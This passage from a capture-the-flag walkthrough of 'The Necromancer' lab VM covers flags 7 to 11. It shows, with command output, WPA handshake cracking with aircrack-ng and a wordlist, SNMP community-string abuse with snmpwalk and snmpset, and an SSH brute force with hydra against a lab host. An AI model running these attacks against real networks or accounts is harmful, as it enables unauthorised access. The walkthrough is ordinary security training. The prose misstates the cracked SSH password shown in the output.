    It's the <a href="./necromancer">necromancer!</a><br><br>
   <img src="../pics/necromancer.jpg">
    <p><font size=2>Image copyright:<a href="http://www.deviantart.com/art/The-Warlock-Necromancer-339634655" target=_blank> Manzanedo</a></font>
</p><br><br><br>
    Again he stares at you with deathly hollow eyes.  <br><br>
    He is standing in a doorway; a staff in one hand, and an object in the other.  <br><br>
    Smirking, the necromancer holds the staff and the object in the air.<br><br>
    He points his staff in your direction, and the stench of death and decay begins to fill the air.<br><br>
    You stare into his eyes and then.......<br><br><br><br><br><br><br><br><br>
    ...... darkness.  You open your eyes and find yourself lying on the damp floor of the cave.<br><br>
    The amulet must have saved you from whatever spell the necromancer had cast.<br><br>
    You stand to your feet.  Behind you, only darkness.<br><br>
    Before you, a large door with the symbol of a skull engraved into the surface. <br><br>
    Looking closer at the skull, you can see u161 engraved into the forehead.<br><br>
    </font>
  </body>
</html>
{% endhighlight %}

## Flag7 - mibwalker of d00m.

The link downloads another binary file and makes reference to UDP/161 which is SNMP.  Lets take a look at the downloaded `necromancer` file.

{% highlight bash %}
root@kali:~/evidence/necromancer# file necromancer
necromancer: bzip2 compressed data, block size = 900k
root@kali:~/evidence/necromancer# bunzip2 necromancer
bunzip2: Can''t guess original name for necromancer -- using necromancer.out
root@kali:~/evidence/necromancer# file necromancer.out
necromancer.out: POSIX tar archive (GNU)
root@kali:~/evidence/necromancer# tar -xvf necromancer.out
necromancer.cap
root@kali:~/evidence/necromancer# file necromancer.cap
necromancer.cap: tcpdump capture file (little-endian) - version 2.4 (802.11, capture length 65535)
root@kali:~/evidence/necromancer# -
{% endhighlight %}

After a bit of unpacking (which could have been done neater I suppose) we get a PCAP file.  Lets take a quick peek with tcpdump and see if it hints at what is contained within.

{% highlight bash %}
root@kali:~/evidence/necromancer# tcpdump -qns 0 -A -r necromancer.cap | head
reading from file necromancer.cap, link-type IEEE802_11 (802.11)
01:36:15.245276 Beacon (community) [1.0* 2.0* 5.5* 11.0* 18.0 24.0 36.0 54.0 Mbit] ESS CH: 11, PRIVACY
........d.1..	community......$0Hl.........*../..0.........................2....`-.|.........................=........................	......,.....P.....P.....P...P.....P.......P..........''...BC^.b2/.
01:36:15.436228 Clear-To-Send RA:68:64:4b:3d:93:4c
01:36:15.577032 Request-To-Send TA:58:98:35:a2:f5:a1
01:36:15.577076 Clear-To-Send RA:58:98:35:a2:f5:a1
01:36:15.577545 Request-To-Send TA:58:98:35:a2:f5:a1
01:36:15.577588 Clear-To-Send RA:58:98:35:a2:f5:a1
01:36:15.577545 Request-To-Send TA:58:98:35:a2:f5:a1
01:36:15.577588 Clear-To-Send RA:58:98:35:a2:f5:a1
01:36:15.578569 Request-To-Send TA:58:98:35:a2:f5:a1
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Looks like Wireless data to me, after a quick look in Wireshark it is encrypted.  So lets smash that!

{% highlight bash %}
root@kali:~/evidence/necromancer# aircrack-ng necromancer.cap -w /usr/share/wordlists/rockyou.txt
Opening necromancer.cap
Read 2197 packets.

   #  BSSID              ESSID                     Encryption

   1  C4:12:F5:0D:5E:95  community                 WPA (1 handshake)

Choosing first network as target.

Opening necromancer.cap
Reading packets, please wait...

                                 Aircrack-ng 1.2 rc4

      [00:00:06] 16096/9822768 keys tested (2546.43 k/s)

      Time left: 1 hour, 4 minutes, 11 seconds                   0.16%

                           KEY FOUND! [ death2all ]


      Master Key     : 7C F8 5B 00 BC B6 AB ED B0 53 F9 94 2D 4D B7 AC
                       DB FA 53 6F A9 ED D5 68 79 91 84 7B 7E 6E 0F E7

      Transient Key  : EB 8E 29 CE 8F 13 71 29 AF FF 04 D7 98 4C 32 3C
                       56 8E 6D 41 55 DD B7 E4 3C 65 9A 18 0B BE A3 B3
                       C8 9D 7F EE 13 2D 94 3C 3F B7 27 6B 06 53 EB 92
                       3B 10 A5 B0 FD 1B 10 D4 24 3C B9 D6 AC 23 D5 7D

      EAPOL HMAC     : F6 E5 E2 12 67 F7 1D DC 08 2B 17 9C 72 42 71 8E
root@kali:~/evidence/necromancer# -
{% endhighlight %}

A rather quick run through the rockyou list provides the password `death2all`.  Now that we have a password and port, we can try to use it as the community string for an SNMP walk.

{% highlight bash %}
root@kali:~/evidence/necromancer# snmpwalk -v 2c -c death2all 192.168.92.138
Created directory: /var/lib/snmp/mib_indexes
iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is Locked. If you choose to defeat me, the door must be Unlocked."
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "Locked - death2allrw!"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Hah ok.  Door needs to be unlocked but `iso.3.6.1.2.1.1.6.0` says it is locked.  It also seems to provide the read/write community string.  Lets change some MIBS!

{% highlight bash %}
root@kali:~/evidence/necromancer# snmpset -v 2c -c death2allrw 192.168.92.138 iso.3.6.1.2.1.1.6.0 s "Unlocked"
iso.3.6.1.2.1.1.6.0 = STRING: "Unlocked"
root@kali:~/evidence/necromancer# snmpwalk -v 2c -c death2all 192.168.92.138iso.3.6.1.2.1.1.1.0 = STRING: "You stand in front of a door."
iso.3.6.1.2.1.1.4.0 = STRING: "The door is unlocked! You may now enter the Necromancer's lair!"
iso.3.6.1.2.1.1.5.0 = STRING: "Fear the Necromancer!"
iso.3.6.1.2.1.1.6.0 = STRING: "flag7{9e5494108d10bbd5f9e7ae52239546c4} - t22"
iso.3.6.1.2.1.1.6.0 = No more variables left in this MIB View (It is past the end of the MIB tree)
root@kali:~/evidence/necromancer# -
{% endhighlight %}

Excellent, flag7 is now in our possession. Running it through a MD5 decipher tool results in `demonslayer`, appropriate.  Also 22 seems open, time to ssh finally!  

## Flag 8 - Hydra!

But we have no username or we have no password.  Hmm, well I suppose I am the `demonslayer` so I will use that as the username and then try brute force for the password.  Summon hydra!

{% highlight bash %}
root@kali:~/evidence/necromancer# hydra -l demonslayer -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.92.138
Hydra v8.2 (c) 2016 by van Hauser/THC - Please do not use in military or secret service organizations, or for illegal purposes.

Hydra (http://www.thc.org/thc-hydra) starting at 2016-09-20 11:43:11
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 64 tasks, 14344399 login tries (l:1/p:14344399), ~14008 tries per task
[DATA] attacking service ssh on port 22
[22][ssh] host: 192.168.92.138   login: demonslayer   password: 12345678
^CThe session file ./hydra.restore was written. Type "hydra -R" to resume session.
root@kali:~/evidence/necromancer# -
{% endhighlight %}

And quite quickly we get the password as `1234568`.  I wonder if that's the combination to his luggage...

We have ssh open, a username and a password lets dive right in then.

{% highlight bash %}
root@kali:~/evidence/necromancer# ssh demonslayer@192.168.92.138
The authenticity of host '192.168.92.138 (192.168.92.138)' can't be established.
ECDSA key fingerprint is SHA256:sIaywVX5Ba0Qbo/sFM3Gf9cY9SMJpHk2oTZmOHKTtLU.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '192.168.92.138' (ECDSA) to the list of known hosts.
demonslayer@192.168.92.138's password:
Last login: Fri Sep  2 01:59:11 2016 from 192.168.92.135

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

$ ls
flag8.txt
$ cat flag8.txt                                                                                      
You enter the Necromancer's Lair!

A stench of decay fills this place.  

Jars filled with parts of creatures litter the bookshelves.

A fire with flames of green burns coldly in the distance.

Standing in the middle of the room with his back to you is the Necromancer.  

In front of him lies a corpse, indistinguishable from any living creature you have seen before.

He holds a staff in one hand, and the flickering object in the other.

"You are a fool to follow me here!  Do you not know who I am!"

The necromancer turns to face you.  Dark words fill the air!

"You are damned already my friend.  Now prepare for your own death!"

Defend yourself!  Counter attack the Necromancer's spells at u777!

$ -
{% endhighlight %}

## Flag - 8 - For real this time!

Well Flag8 was quick, looks like we have to locally connect to UDP 777 now.

{% highlight bash %}
$ nc -u 127.0.0.1 777



** You only have 3 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Where do the Black Robes practice magic of the Greater Path? Kelewan

flag8{55a6af2ca3fee9f2fef81d20743bda2c}
{% endhighlight %}

Google to the rescue.  It pointed me to a nice wikipedia article stating [Kelewan](https://en.wikipedia.org/wiki/Tsurani).  The next one threw me for a loop though and I got it wrong wrong wrong.  Once you lose all 3 HP your booted out and you basically need to start over from the beginning.  So hopefully you took good notes!

## Flag 9 - The devil is in the details....

{% highlight bash %}
Who did Johann Faust VIII make a deal with? Mephistopheles

flag9{713587e17e796209d1df4c9c2c2d2966}



** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!
{% endhighlight %}

Googling again for Johann Faust VII make a deal came up with various pages like [this](http://shamankingarchive.wikia.com/wiki/Faust_VIII) one.  My failure to read thoroughly resulted in me trying 'devil', 'the devil' and 'Devil' all of which were incorrect.  Reading a bit further it states that the devil is more commonly known as `Mephistopheles` in Faust literature.

## Flag 10 - Hedge your bets

The last question is another necromantic character out of [The Old Kingdom Trilogy](https://en.wikipedia.org/wiki/List_of_Old_Kingdom_characters).   Farther down the page it notes `Hedge` was the one tricked.

{% highlight bash %}
** You only have 2 hitpoints left! **

Defend yourself from the Necromancer's Spells!

Who is tricked into passing the Ninth Gate?  Hedge


flag10{8dc6486d2c63cafcdc6efbba2be98ee4}
{% endhighlight %}

## Flag 11 - Root! or not

Last questioned answered we are once again dropped into our trusty shell.

{% highlight bash %}
A great flash of light knocks you to the ground; momentarily blinding you!

As your sight begins to return, you can see a thick black cloud of smoke lingering where the Necromancer once stood.

An evil laugh echoes in the room and the black cloud begins to disappear into the cracks in the floor.

The room is silent.

You walk over to where the Necromancer once stood.

On the ground is a small vile.

{% endhighlight %}

Ok interesting there is small vile.  Performing an `ls -alh` shows one new file `.smallvile` guess thats it.

{% highlight bash %}
$ cat .smallvile                                                                                                                


You pick up the small vile.

Inside of it you can see a green liquid.

Opening the vile releases a pleasant odour into the air.

You drink the elixir and feel a great power within your veins!

$
{% endhighlight %}

Ok great power, perhaps its sudo power?

{% highlight bash %}
$ sudo -l
Matching Defaults entries for demonslayer on thenecromancer:
    env_keep+="FTPMODE PKG_CACHE PKG_PATH SM_PATH SSH_AUTH_SOCK"

User demonslayer may run the following commands on thenecromancer:
    (ALL) NOPASSWD: /bin/cat /root/flag11.txt
$ sudo cat /root/flag11.txt



Suddenly you feel dizzy and fall to the ground!

As you open your eyes you find yourself staring at a computer screen.

Congratulations!!! You have conquered......

          .                                                      .
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        ~~~~~~~       9X.          .db|db.          .XP       ~~~~~~~
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '                       
                               THE NECROMANCER!
                                 by  @xerubus

                   flag11{42c35828545b926e79a36493938ab1b1}


Big shout out to Dook and Bull for being test bunnies.

Cheers OJ for the obfuscation help.

Thanks to SecTalks Brisbane and their sponsors for making these CTF challenges possible.

"========================================="
"  xerubus (@xerubus) - www.mogozobo.com  "
"========================================="


$
{% endhighlight %}

Victory!

## End Thoughts

Necromancer was a fun little vunlerable system.  I was really excited to see the binary exploiting in it, as I am trying to work on those skills.  Outside of that it was pretty simple, but I knew that before starting.  Overall great theming and fun times.
